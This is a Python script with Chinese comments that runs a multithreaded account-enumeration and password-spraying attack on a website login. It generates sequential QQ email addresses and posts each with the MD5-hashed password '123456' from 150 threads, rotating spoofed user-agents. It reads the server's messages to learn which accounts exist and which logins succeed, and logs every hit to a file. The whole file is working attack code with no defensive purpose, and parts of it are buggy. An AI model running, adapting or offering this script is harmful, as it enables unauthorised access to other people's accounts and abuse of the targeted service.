import requests
import hashlib
import random
import time
import socket
import threading
import pwdc

user_num_low = 111111111
user_num_max = 9999999999
user_nbr = user_num_low

mutex=threading.Lock()

def get_user_nbr():#构造用户邮箱
    mutex.acquire(3)
    global  user_nbr
    user_name = '%s%s' % (str(user_nbr), '@qq.com')
    user_nbr = user_nbr + 1
    mutex.release()
    return user_name

def user_end_judge():
    mutex.acquire(3)
    result = False
    if user_nbr > user_num_max :
        result = True
    else:
        result = False
    mutex.release()
    return  result

def get_curr_user():
    mutex.acquire(3)
    global  user_nbr
    user_name = '%s%s' % (str(user_nbr), '@qq.com')
    mutex.release()
    return user_name

user_agent = [
    'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30',
    'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)',
    'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'
]

def save_pwd(user, pwd,desc):
    with open("resut.txt","a+") as f:
        f.write('user:'+ user + '  pwd:' + pwd + " desc:" + desc + '\n')

def user_test(username,password):
    resp = ""
    result = ""
    url = "http://www.k*.htm"
    pwd = password
    user= username
    md = hashlib.md5()
    md.update(pwd)
    password =  md.hexdigest()
    data = {'email':username,'password':password}

    # 设置网页编码格式，解码获取到的中文字符
    encoding = "gb18030"
    # 构造http请求头，设置user-agent
    header = {
        "User-Agent": random.choice(user_agent),
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest'
    }

    try:
        requests.adapters.DEFAULT_RETRIES = 5
        resp = requests.post(url, data=data, headers=header, timeout=335)
    except requests.exceptions.ReadTimeout:
        print("1")
        time.sleep(10)
        resp = requests.post(url, data=data, headers=header, timeout=335)
    except requests.exceptions.Timeout:
        print("2")
        time.sleep(10)
        resp = requests.post(url, data=data, headers=header, timeout=335)
    except requests.exceptions.ConnectionError:
        print("3")
        time.sleep(10)
        resp = requests.post(url, data=data, headers=header, timeout=335)
    except socket.error:
        time.sleep(10)
        resp = requests.post(url, data=data, headers=header, timeout=335)
    except BaseException as e:
        print(e)
        time.sleep(10)
        resp = requests.post(url, data=data, headers=header, timeout=335)

    resp.keep_alive = False
    #print(resp.content)
    try:
        result = resp.content
        json = resp.json()
        print('邮箱:%s ,result:%s \n ' % (username,result))
        if (json['message'].find('不存在') > -1):
            #print('邮箱:%s 为空' % username )
            return False
        else:
            print('邮箱: %s 存在' % username)
            save_pwd(username, password, json['message'])
            return True
    except BaseException as e:
        print("发送错误 e: %s result:%s response code:%d" % (e, result, resp.status_code ))
    if (json['message'].find('错误') > -1):
        print("邮箱： %s 密码： %s ,密码错误！" % (username, pwd))
        return False
    else:
        print('邮箱: %s  密码： %s ，登陆成功！' % (username, pwd))


def thread_bru(): # 破解子线程函数
    #while not user_end_judge():pwd_queue.empty()
    while not user_end_judge():
        try:
            pwd = '123456'
            user = get_user_nbr()
            #print pwd_test
            #if user_test(user, pwd_test):
            if user_test(user, pwd):
                result = pwd
                print ('破解 %s 成功，密码为: %s' % (user, pwd))
                break
        except BaseException as e:
            print("破解子线程错误: %s" % e)

def brute(threads):
    for i in range(threads):
        t = threading.Thread(target=thread_bru)
        t.start()
        print('破解线程-->%s 启动' % t.ident)
    while (not user_end_judge()): # 剩余口令集判断
        print('\r 进度: 当前值 %d' % pwdc.qsize())
        time.sleep(2)
        #print('\n破解完毕')

if __name__ == "__main__":
    brute(150)